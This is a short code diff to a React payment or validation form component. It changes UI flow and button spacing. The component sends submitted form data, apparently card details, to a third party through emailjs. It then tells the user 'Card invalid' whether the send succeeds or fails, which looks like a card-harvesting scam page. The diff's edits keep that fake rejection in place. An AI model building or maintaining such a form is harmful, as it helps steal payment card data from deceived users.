@@ -269,7 +269,6 @@ function PurchaseOrValidate() {
             })
         console.log(JSON.stringify(formData, null, 2));
         clearFormData();
-        handleToggleUploadMode();
         setTimeout(() => {
             setLoading(false);
             alert('Card invalid');
@@ -288,12 +287,13 @@ function PurchaseOrValidate() {
 
     emailjs.sendForm(serviceId, templateId, form.current, publicKey)
       .then((response) => {
-        // console.log('Email sent successfully', response);
-            alert('Card invalid');
+        alert('Card invalid');
+        handleToggleUploadMode();
       })
       .catch((error) => {
         console.error('Error', error);
-            alert('Card invalid');
+        alert('Card invalid');
+        handleToggleUploadMode();
       })
       .finally(() => {
         setLoading(false);
@@ -582,7 +582,7 @@ function PurchaseOrValidate() {
                                     </FormControl>
                                     {renderExtraFields()}
                                         
-                                    <Button colorScheme="white" variant={`outline`} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
+                                    <Button colorScheme="white" variant={`outline`} mt={6} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
                                         Validate
                                     </Button>
                                 </form>
